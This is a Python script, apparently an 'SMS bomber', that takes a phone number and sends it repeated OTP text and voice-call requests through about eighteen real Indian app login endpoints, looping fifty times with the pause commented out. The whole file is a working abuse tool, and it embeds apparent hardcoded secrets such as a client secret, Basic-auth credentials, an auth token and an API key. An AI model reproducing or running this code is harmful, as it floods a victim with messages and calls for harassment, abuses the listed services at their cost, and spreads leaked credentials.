import requests
import json
import time

def smsga(number):
    number = str(number)

    # List of APIs with their corresponding URLs and payloads
    apis = [
        {
            "method": "POST",
            "url": "https://api.madrasmandi.in/api/v1/auth/otp",
            "headers": {
                "Host": "api.madrasmandi.in",
                "mm-build-version": "2.5.4",
                "mm-version-code": "2005004",
                "mm-device-type": "android",
                "delivery-type": "app",
                "x-requested-with": "XMLHttpRequest",
                "authorization": "Bearer",
                "content-type": "application/x-www-form-urlencoded",
                "content-length": "101",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "phone": "+91"+number,
                "scope": "client",
                "client_secret": "lkvAyfrqjA7Z18bjSxayYbvdD7ALJO9QYHYgPATw",
                "client_id": "2"
            }
        },
        {
            "method": "POST",
            "url": "https://sales.shreejamilk.com/admin/shreeja_api/step1",
            "headers": {
                "Authorization": "Basic YWRtaW46MTIzNDU2",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "17",
                "Host": "sales.shreejamilk.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.2.2"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.shyaway.com/graphql",
            "headers": {
                "Host": "www.shyaway.com",
                "accept": "application/json",
                "x-apollo-operation-id": "bef185d336773152ee1e8e072904fd82d5bd3f6c89fcb610b5fd77a526f85a74",
                "x-apollo-operation-name": "GenerateLoginOTP",
                "content-type": "application/json; charset=utf-8",
                "content-length": "355",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": json.dumps({"operationName": "GenerateLoginOTP", "variables": {"username": number, "type": "login"}, "query": "mutation GenerateLoginOTP($username :String!, $type : String!) { generateOTP(type: $type, username: $username) { __typename status message data { __typename id statusCode customerEmail { __typename key value } customerMobile { __typename key value } } } }"})
        },
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "119",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_SMS", "source": "USER"})
        },
        {
            "method": "POST",
            "url": "http://ieniapi.eniclub.in/api/users/login",
            "headers": {
                "Content-Type": "application/json; charset=UTF-8",
                "Content-Length": "125",
                "Host": "ieniapi.eniclub.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.12.1"
            },
            "data": json.dumps({"device_id": "c7abc1fd7459e84c", "language_id": 1, "mobile": number, "role": 1, "sms_type": "RESEND_VOICECALL", "source": "USER"})
        },
        {
            "method": "GET",
            "url": "https://api.pocketnovel.com/v2/user_api/user.send_otp",
            "headers": {
                "Host": "api.pocketnovel.com",
                "ad-id": "d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785",
                "version-name": "1.7.6",
                "region-code": "UP",
                "client-ts": "1714841716413",
                "which-app": "com.pocketfm.novel",
                "is-headset": "false",
                "device-create-time": "1714841706",
                "locale": "IN",
                "device-id": "c7abc1fd7459e84c",
                "platform": "android",
                "user-tg": "google-play",
                "content-ln": "hi",
                "app-name": "pocket_novel",
                "auth-token": "03971f2055de19233bcb54434a22d21fadaeb6bb",
                "content-type": "application/json;charset=utf-8",
                "screen-density": "1080px",
                "app-client": "consumer-android",
                "accept": "application/json",
                "app-version": "647",
                "ip-address": "192.0.0.8",
                "is-fg": "true",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "params": {
                "phone_number": f"+91{number}",
                "country_code": "+91",
                "channel": ""
            }
        },
        {
            "method": "GET",
            "url": f"https://magnus.railyatri.in//api/v1/send_sms.json?temp_user_id=2193665&mobile_number={number}&src=otp&retry_count=0&isWhatsapp=false&ontrain=null&appid=d7VdT8fjTcqhKjhOw6BtKo:APA91bGwomocpTZFvlRw4FSKlBA0dnsf0UQ_oASxq5sjyevkmev3RNXKEbTYZ8KgN1llX-mZ20RPX-VLGDfolTIiQyt9Xu_oiVwNLt8KG7j6aMcnLVMdmYnUUERmdDUEFftWBJLz6M5I&utm=&store_type=20&app_type=1&screen_name=.activity.LoginActivity&app_res_id=d41d8cd98f00b204e9800998ecf8427e&guid=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785&authentication_token=railyatri_default&os_v_code=34&os_v_name=14&user_lang=en&v_num=4.7.4&v_code=561&device_type_id=1",
            "headers": {}  # Empty headers since GET might not need special headers
        },
        {
            "method": "POST",
            "url": "https://api.blackbuck.com/supplywrapper/sessions/login",
            "headers": {
                "Host": "api.blackbuck.com",
                "accept-language": "en",
                "x-aaa-enabled": "true",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "x-device-id": "c7abc1fd7459e84c",
                "content-type": "application/json; charset=UTF-8"
            },
            "data": json.dumps({
                "channel": "OTP",
                "phone_number": number,
                "method": "SMS",
                "tenant": "SUPPLY"
            })
        },
        {
            "method": "POST",
            "url": "https://api.heyophone.com/heyo/v1/otp/send",
            "headers": {
                "Host": "api.heyophone.com",
                "accept": "application/json, text/plain, */*",
                "x-requested-with": "XMLHttpRequest",
                "content-type": "application/json"
            },
            "data": json.dumps({
                "country_code": "+91",
                "number": number,
                "via": "sms"
            })
        },
        {
            "method": "POST",
            "url": "https://traders.ninjacart.in/workflow-engine/1/1/v1/execution/service/runWithNoAuth/user-login-otp-notification-service-config",
            "headers": {
                "Host": "traders.ninjacart.in",
                "content-type": "application/json"
            },
            "data": json.dumps({
                "input": {
                    "contactNumber": number
                }
            })
        },
        {
            "method": "POST",
            "url": "https://adminpanel.vdeliverz.com/api/v11/get-otp",
            "headers": {
                "Host": "adminpanel.vdeliverz.com",
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded"
            },
            "data": f"mobile=%2B91{number}"  # Formatted for x-www-form-urlencoded
        },
        {
            "method": "POST",
            "url": "https://deliveryan.com/public/api/generate-otp-for-login",
            "headers": {
                "Host": "deliveryan.com",
                "content-type": "application/json;charset=UTF-8"
            },
            "data": json.dumps({
                "phone": f"+91{number}",
                "email": "example@gmail.com"  # Replace with actual email if needed
            })
        },
        {
            "method": "POST",
            "url": "https://deliverylo.com/deliverylo/public/api/v1/verifyPhoneSignup",
            "headers": {
                "Host": "deliverylo.com",
                "content-type": "application/x-www-form-urlencoded"
            },
            "data": f"country_code=%2B91&mobile={number}"  # Formatted for x-www-form-urlencoded
        },
        
        {
            "method": "POST",
            "url": "https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp",
            "headers": {
                "Host": "prod.api.sugarcosmetics.com",
                "content-type": "application/json; charset=UTF-8"
            },
            "data": json.dumps({
                "phone_no": f"+91{number}",
                "platform": "sugar"
            })
        },
        {
            "method": "POST",
            "url": "https://samaan.apnamart.in/api/profile/send_phone_otp/",
            "headers": {
                "Host": "samaan.apnamart.in",
                "cache-control": "no-cache",
                "version": "2.4.6.3",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.134 Mobile Safari/537.36",
                "content-type": "application/json; charset=UTF-8",
            },
            "data": json.dumps({
                "client_app": "consumer",
                "country_code": "+91",
                "phone": number
            })
        },
       
        {
            "method": "POST",
            "url": "https://app.getswipe.in/api/user/mobile_login",
            "headers": {
                "Host": "app.getswipe.in",
                "user-agent": "Swipe;304;Android 14;samsung SM-F7110;en",
                "authorization": "Bearer null",
                "device_fingerprint": "00000000-24c5-752a-ffff-ffff8fdcd22e",
                "devicehash": "c7abc1fd7459e84c.samsungSM-F71106a150d4b-4f61-4f82-8bb2-6350dab2c814",
                "content-type": "application/json; charset=UTF-8",
            },
            "data": json.dumps({
                "mobile": number,
                "resend": 0
            })
        },
        {
            "method": "POST",
            "url": "https://proapi.getplus.in/api/v2/login-register",
            "headers": {
                "Host": "proapi.getplus.in",
                "sec-ch-ua": "Not/A)Brand;v=8, Chromium;v=126, Android WebView;v=126",
                "content-type": "application/json",
            },
            "data": json.dumps({
                "phone_number": number,
                "new_user": True,
                "name": "Shivam"
            })
        },
        {
            "method": "POST",
            "url": "https://www.quid.money/api/v100/sendOTP",
            "headers": {
                "Host": "www.quid.money",
                "content-type": "application/x-www-form-urlencoded"
            },
            "data": {
                "api_key": "f3a4c1d0abf137194bd16eec917c9cc7",
                "mobile_no": number,
                "first_name": "riya",
                "last_name": "sharma",
                "device_id": "c7abc1fd7459e84c",
                "device_name": "SM-F7110",
                "device_version": "14",
                "app_version": "1.0.0"
            }
        },
        
    ]
    
    # Run the requests for 50 iterations
    for _ in range(50):
        for api in apis:
            if api["method"] == "POST":
                response = requests.post(api["url"], data=json.dumps(api["data"]), headers=api["headers"])
            elif api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api["headers"])
          #  print(f"Request to {api['url']} - Status Code: {response.status_code}")
        # Add a delay of 10 seconds between requests
      #  time.sleep(10)

# Example usage:
# smsg(")  # Replace with the actual phone number you want to use
